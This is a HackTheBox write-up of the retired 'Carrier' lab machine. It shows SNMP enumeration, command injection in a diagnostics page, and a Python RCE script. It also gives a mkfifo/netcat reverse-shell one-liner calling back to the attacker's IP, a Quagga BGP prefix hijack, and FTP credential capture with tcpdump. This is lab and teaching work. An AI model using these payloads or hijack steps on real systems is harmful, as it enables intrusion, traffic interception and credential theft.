---
title: HTB: Carrier
url: https://0xdf.gitlab.io/2019/03/16/htb-carrier.html
date: 2019-03-16T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-carrier, injection, command-injection, bgp-hijack, nmap, gobuster, snmp, snmpwalk, pivot, container, tcpdump, lxc, lxd, ssh
---

![Carrier-cover](https://0xdfimages.gitlab.io/img/carrier-cover.png)

Carrier was awesome, not because it super hard, but because it provided an opportunity to do something that I hear about all the time in the media, but have never been actually tasked with doing - BGP Hijacking. I’ll use SMNP to find a serial number which can be used to log into a management status interface for an ISP network. From there, I’ll find command injection which actually gives me execution on a router. The management interface also reveals tickets indicting some high value FTP traffic moving between two other ASNs, so I’ll use BGP hijacking to route the traffic through my current access, gaining access to the plaintext credentials. In Beyond Root, I’ll look at an unintended way to skip the BGP hijack, getting a root shell and how the various containers were set up, why I only had to hijack one side of the conversation to get both sides, the website and router interaction and how to log commands sent over ssh, and what “secretdata” really was.

## Box Info

| Name | [Carrier](https://hackthebox.com/machines/carrier)  [Carrier](https://hackthebox.com/machines/carrier) [Play on HackTheBox](https://hackthebox.com/machines/carrier) |
| --- | --- |
| Release Date | [22 Sep 2018](https://twitter.com/hackthebox_eu/status/1042738637090250752) |
| Retire Date | 16 Mar 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Carrier |
| Radar Graph | Radar chart for Carrier |
| First Blood User | 00:19:24[Arcocapaz Arcocapaz](https://app.hackthebox.com/users/1772) |
| First Blood Root | 06:39:07[braindamaged braindamaged](https://app.hackthebox.com/users/38653) |
| Creator | [snowscan snowscan](https://app.hackthebox.com/users/9267) |

## Recon

### nmap

`nmap` shows me a website on TCP 80, ssh on TCP 22, and SNMP on UDP 161:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-21 15:58 EDT
Nmap scan report for 10.10.10.105
Host is up (0.019s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
root@kali# nmap -sC -sV -p22,80 -oA nmap/scripts 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-21 15:59 EDT
Nmap scan report for 10.10.10.105
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds

root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-21 16:27 EDT
Warning: 10.10.10.105 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.105                        
Host is up (0.075s latency). 
Not shown: 65397 open|filtered ports, 137 closed ports
PORT    STATE SERVICE                                       
161/udp open  snmp
                                                                
Nmap done: 1 IP address (1 host up) scanned in 145.21 seconds  

root@kali# nmap -sU -p 161 -sV -oA nmap/udpscripts 10.10.10.105
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-11 14:05 EDT
Nmap scan report for 10.10.10.105
Host is up (0.019s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds

```

Based on the [Apache version](https://packages.ubuntu.com/search?keywords=apache), it looks like I’m dealing with Xenial / Ubuntu 16.04.

There’s also something weird going on with FTP.

### SNMP - UDP 161

SNMP is open, and it only reports one node using v1, which `nmap` identified:

```

root@kali# snmpwalk -c public -v 1 10.10.10.105
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB

```

“SN” could mean serial number, and I’ll note it for later.

### Website - TCP 80

#### Site

The site itself presents a login page with two error codes:

![1540153814462](https://0xdfimages.gitlab.io/img/1540153814462.png)

#### gobuster

`gobuster` gives me a few interesting paths to check out:

```

root@kali# gobuster -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 40

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.105/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php
[+] Timeout      : 10s
=====================================================
2018/10/21 16:24:08 Starting gobuster
=====================================================
/img (Status: 301)
/doc (Status: 301)
/index.php (Status: 200)
/tools (Status: 301)
/css (Status: 301)
/js (Status: 301)
/tickets.php (Status: 302)
/fonts (Status: 301)
/dashboard.php (Status: 302)
/debug (Status: 301)
/diag.php (Status: 302)
/server-status (Status: 403) 
=====================================================
2018/10/21 16:31:37 Finished
=====================================================

```

#### /doc

The `/doc` path gives a dir list with two files:

![1540160130427](https://0xdfimages.gitlab.io/img/1540160130427.png)

The image is an ISP level network diagram:

![1540328372868](https://0xdfimages.gitlab.io/img/1540328372868.png)

The pdf has a list of error codes, including two that match those shown on the login page:

![1540160248092](https://0xdfimages.gitlab.io/img/1540160248092.png)

The second error code says that the password is the serial number, which I got over SNMP. Looks like I have what I need to log in.

### Website Authenticated - TCP 80

#### Logging In

Logging in with admin / NET\_45JDX23 works:

![1540328518567](https://0xdfimages.gitlab.io/img/1540328518567.png)

#### Tickets

The tickets page has a list of tickets on it:

![](https://0xdfimages.gitlab.io/img/carrier-tickets.png)

This one is particularly interesting:

> Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24’s, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating… Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.

#### Diagnostics Page

On the Diagnostics tab, there’s a button to “Verify Status”. On clicking, it outputs some text that looks like grepped output from a `ps aux` command:

![1540328680234](https://0xdfimages.gitlab.io/img/1540328680234.png)

## Shell as root on r1

### RCE in Diagnostics

#### Analysis of Request

Looking in Burp, clicking the button generated a POST request:

```

POST /diag.php HTTP/1.1
Host: 10.10.10.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.105/diag.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Cookie: PHPSESSID=forvn6e8kjv4bkdrnb874q2026
Connection: close
Upgrade-Insecure-Requests: 1

check=cXVhZ2dh

```

After some experimentation, I’ll notice that the value passed to check is base64 encoded, and decodes to “quagga”, which happens to be the string in each of the lines above.

#### Modify Grep

I’ll send this POST to repeater and see what I can do. If I jump into Burp repeater and change check to `cm9vdA%3d%3d`, which is the base64 then url encoding of “root”, I’ll get a list of root processes running on the host:

![1540328996113](https://0xdfimages.gitlab.io/img/1540328996113.png)

#### RCE

It looks like I can change the string being grepped. I’ll hypothesize that the command on the other end looks something like `ps aux | grep $(echo $_POST['check'] | base64 -d)`. So what if I send `abcd; id`, which encodes to `YWJjZDsgaWQ=`?

![1540329358580](https://0xdfimages.gitlab.io/img/1540329358580.png)

Two interesting things to note:
- I’ve got RCE!
- I can actually see the command that’s run. That’s because in the standard case, the results are piped into `grep -v grep` to remove the grep line from the output. But once I break the commands with a `;`, it’s now the results of the `id` command getting piped to `grep -v`. So the resulting query looks like:

```

ps aux | grep $(echo YWJjZDsgaWQ= | base64 -d) | grep -v grep

```

which resolves to:

```

ps aux | grep abcd; id | grep -v grep

```

The first command returns the only two lines in the `ps` output with abcd in them, both my commands, and then the id returns it’s results, and since grep isn’t in those results, the `grep -v` has no impact.

### Scripted Shell

It’s not really necessary, but writing a script to loop and take commands and get results will make the next steps easier, and this script was super easy to write. I’ll use a `session` from `requests` to log in in my `__init__()`, and then simply issue requests and use `re` to match the results:

```

#!/usr/bin/python3

import re
import requests
from base64 import b64encode
from cmd import Cmd

pat = re.compile("<p>aaaaaaaaaaaaaaaa</p><p>(.*)</p><p>bbbbbbbbbbbbbbb", re.DOTALL)

class Terminal(Cmd):

    prompt = "root@r1# "

    def __init__(self):
        super().__init__()
        self.s = requests.session()
        self.s.post('http://10.10.10.105/', data={'username': 'admin', 'password': 'NET_45JDX23'})

    def default(self, args):
        try:
            encoded_cmd = b64encode(f'abcd; echo aaaaaaaaaaaaaaaa; {args} 2>&1; echo bbbbbbbbbbbbbbb'.encode())
            r = self.s.post('http://10.10.10.105/diag.php', data={'check': encoded_cmd})
            print(re.search(pat, r.text).group(1).replace("</p><p>", "\n"))
        except AttributeError:
            pass

    def do_shell(self, args):
        ip, port = args.split(' ', 2)[:2]
        self.default(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")

term = Terminal()
term.cmdloop()

```

I could take this even further and write a stateful shell using pipes (like in Stratosphere), but there’s no need here.

The script works:

```

root@kali# ./carrier-rce2.py
root@r1# id
uid=0(root) gid=0(root) groups=0(root)
root@r1# pwd
/root
root@r1# ls
stuff
test_intercept.pcap
user.txt

```

I can even grab `user.txt`:

```

root@r1# cat user.txt
5649c41d...

```

### Full Shell

With RCE, going to full blown shell is pretty simple:

```

root@r1# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 >/tmp/f

```

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.105] 55896
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```

I also added it to the shell so I can just type `shell [ip] [port]`:

```

root@r1# shell 10.10.14.4 443 

```

And with that shell, inside `/root/`, I’ll find `user.txt`:

```

root@r1:~# ls
user.txt
root@r1:~# cat user.txt
5649c41d...

```

## Network Enum

Based on the tickets from the web dashboard, it seems like I’d better figure out what’s going on in this network. I’m going to take notes on the network diagram I found on the webpage.

### Local Enumeration

#### Local IPs

The routes I’m currently on has 3 IPs (and loopback):

```

root@r1:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fed9:4ea/64 scope link 
       valid_lft forever preferred_lft forever
10: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe8a:f24f/64 scope link 
       valid_lft forever preferred_lft forever
12: eth2@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link 
       valid_lft forever preferred_lft forever

```

#### BGP Config
10.99.0.0 is in the AS100, so 10.99.64.2 must be internal. 10.78.10.1 and 10.78.11.1 must be point to point with the other two ASNs. I’ll confirm that looking at the `bgp.conf` file:

```

root@r1:/etc/quagga# cat bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!

```

I’ll update the diagram with those IPs, as well as the remote IPs.

#### Routes

Looking at the routing table shows the subnets that are served by each router:

```

root@r1:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.99.64.1      0.0.0.0         UG    0      0        0 eth0
10.78.10.0      *               255.255.255.0   U     0      0        0 eth1
10.78.11.0      *               255.255.255.0   U     0      0        0 eth2
10.99.64.0      *               255.255.255.0   U     0      0        0 eth0
10.100.10.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.11.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.12.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.13.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.14.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.15.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.16.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.17.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.18.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.19.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.100.20.0     10.78.10.2      255.255.255.0   UG    0      0        0 eth1
10.120.10.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.11.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.12.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.13.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.14.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.15.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.16.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.17.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.18.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.19.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2
10.120.20.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2

```
10.100.0.0/16 goes to 10.78.10.2, which is AS200 / Zaza Telecom.
10.120.0.0/15 goes to 10.78.11.2, which is AS300 / CastCom.

### Network Scanning

#### 10.99.64.0/24

I’m actually going to skip over this network. I believe that all the virtual devices have IPs in this network, but that is an artifact of the virtualization, and not an intended result. If I did scan, I’d see:
- 10.99.64.1 - Listening on SSH, FTP, and web, this is the host
- 10.99.64.2, .3, .4 - Routers, open on SSH and BGP; .2 is the host I’m on now
- 10.99.64.251 - Listening on web and ssh; web gives lyghtspeed page

#### 10.120.15.0/24

The network I want to target based on the ticket is 10.120.15.0/24:

![1540392337407](https://0xdfimages.gitlab.io/img/1540392337407.png)

I know there’s an FTP server in there that contains valuable information. I’ll start with a simple ping sweep:

```

root@r1:~# time for i in $(seq 1 254); do (ping -c 1 10.120.15.${i} | grep "bytes from" &); done;
64 bytes from 10.120.15.1: icmp_seq=1 ttl=64 time=0.043 ms
64 bytes from 10.120.15.10: icmp_seq=1 ttl=63 time=0.045 ms

real    0m0.363s
user    0m0.147s
sys     0m0.069s

```

I’ll upload a [static copy of nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) to target to scan with using `wget` and `python3 -m http.server 80` on my local box.
10.120.15.1 looks like a router:

```

PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp

```
10.120.15.10 looks like the ftp server:

```

root@r1:/dev/shm# ./nmap-static -Pn 10.120.15.10

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-03-11 19:01 UTC
Nmap scan report for 10.120.15.10
Host is up (0.000027s latency).
Not shown: 1202 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds

```

### Network Diagram

Armed with that information I can update the diagram to look like this:

![](https://0xdfimages.gitlab.io/img/carrier-net-diag.png)

## BGP Hijack

### Strategy

I want the traffic that’s coming from somewhere in AS200 to 10.120.15.10 to route through me. So I will add that network as something that this router will advertise. But, a few things I need to be careful about:
1. Prefix length
2. Not sharing with 10.78.11.2

First, the prefix length. I remember from the routing table on this router that the 10.120.15.0/24 is passed to 10.78.11.2:

```

Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.120.15.0     10.78.11.2      255.255.255.0   UG    0      0        0 eth2

```

If I want my new route to be more specific, I’ll advertise 10.120.15.0/25. So I’m saying this router has 10.120.15.0-127, which is more specific than the router from AS300, which is advertising 10.120.15.0-255.

Once I do that, I still want the connection to work. So I’m going to not share that route with AS300. If I did, then the CastCom router would send the traffic to me instead of to the FTP server. Instead, I’m just going to share it with AS200. And, beyond that, I’m going to specifically tell AS200 not to share it further.

### Cron

There’s a cron running every 10 minutes that sets the bgp config back to default:

```

root@r1:/dev/shm# crontab -l | grep -v "^#"
*/10 * * * * /opt/restore.sh

root@r1:/dev/shm# cat /opt/restore.sh 
#!/bin/sh
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga

```

It’s good to know I can use that to reset things if I mess them up as well. But while I’m working, I don’t want that running. So I’ll disable it by making the file not executable: `chmod -x /opt/restore.sh`. When I’m done, I’ll re-enable it with `chmod +x /opt/restore.sh`.

### Current Config

I’ll use `vtysh` from my shell on r1 to connect to the Quagga terminal. First, I’ll check out the current config:

```

root@r1:/dev/shm# vtysh        

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1# show running-config 
Building configuration...

Current configuration:
!
!
interface eth0
 ipv6 nd suppress-ra
 no link-detect
!
interface eth1
 ipv6 nd suppress-ra
 no link-detect
!
interface eth2
 ipv6 nd suppress-ra
 no link-detect
!
interface lo
 no link-detect
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
ip prefix-list 0xdf seq 5 permit 10.120.15.0/25
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10
!
ip forwarding
!
line vty
!
end

```

I’m particularly interested in this section:

```

 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
 !
 route-map to-as200 permit 10
 !
 route-map to-as300 permit 10

```

It defines the neighbors, and it also associates route-maps with each one. These route maps specify which routes are shared to that neighbor. Currently, there’s no additional commands given either route-map, so all routes are shared.

### Hijack

I’ll switch my Quagga terminal into configure mode:

```

r1# configure terminal 
r1(config)#

```

Now, I’ll define a prefix-list that matches the range I’m targeting:

```

r1(config)# ip prefix-list 0xdf permit 10.120.15.0/25

```

Now I’ll give some rules to the route maps I saw above. I’ll start with to-as200. This is the route that I want to advertise to, but I don’t want it to forward that route. I’ll start by saying, at priority 10, check if it matches my IP list, and if so, set the `no-export` string:

```

r1(config)# route-map to-as200 permit 10
r1(config-route-map)# match ip address prefix-list 0xdf
r1(config-route-map)# set community no-export

```

Now, I’m going to define what happens at priority 20, for any route that doesn’t match the ip prefix-list, and that is just permit with nothing special:

```

r1(config-route-map)# route-map to-as200 permit 20

```

So each route will check the rule with priority 10, if it matches the prefix-list and get the `no-export` tag. If it doesn’t match, it will match the default rule at priority 20, and have no additional configuration / restriction.

Now I’ll switch to the as-300 router. This router should not get my new advertisement. So I’ll define priority 10 as a deny, but then only if it matches my prefix-list:

```

r1(config-route-map)# route-map to-as300 deny 10
r1(config-route-map)# match ip address prefix-list 0xdf

```

Now I’ll set at priority 20 a blanket allow:

```

r1(config-route-map)# route-map to-as300 permit 20     

```

I’ll switch context here to edit bgp and add a network to advertise:

```

r1(config-route-map)# router bgp 100
r1(config-router)# network 10.120.15.0 mask 255.255.255.128

```

It’s worth noting that a proper BGP implementation on Cisco, Juniper, etc would check to see if this network is actually in the routing table before injecting it, but Quagga doesn’t care.

Finally, I’ll exit this configuration, and give a soft reset to push my new configuration into place:

```

r1(config-router)# end
r1# clear ip bgp *

```

I can see the new route is being sent to AS200 (second to last route shown):

```

r1# show ip bgp neighbors 10.78.10.2 advertised-routes 
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    10.78.10.1               0         32768 ?
*> 10.78.11.0/24    10.78.10.1               0         32768 ?
*> 10.99.64.0/24    10.78.10.1               0         32768 ?
*> 10.101.8.0/21    10.78.10.1               0         32768 i
*> 10.101.16.0/21   10.78.10.1               0         32768 i
...[snip]...
*> 10.120.14.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/25   10.78.10.1               0         32768 i
*> 10.120.16.0/24   10.78.10.1                             0 300 i
...[snip]...

```

No such route shows up towards 10.78.11.2.

### Collect Traffic

Now I’ll use `tcpdump` to collect traffic on port 21 coming through the router. I’ll limit the collection to `eth2`. If I did any, I would get double collection, since the traffic comes through both interfaces on its path. I’ll let it run for a minute, and then kill it.

```

root@r1:/dev/shm# tcpdump -i eth2 -nnXSs 0 'port 21' -w out.pcap                       
^C
root@r1:/dev/shm# ls -l out.pcap 
-rw-r--r-- 1 root root 2571 Mar 11 21:54 out.pcap

```

I’ll bring it back to my host by base64 encoding it:

```

root@r1:/dev/shm# base64 -w0 out.pcap
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

```

On my local machine, I’ll paste that into a file, and decode it:

```

root@kali# base64 -d dump.pcap.b64 > dump.pcap

```

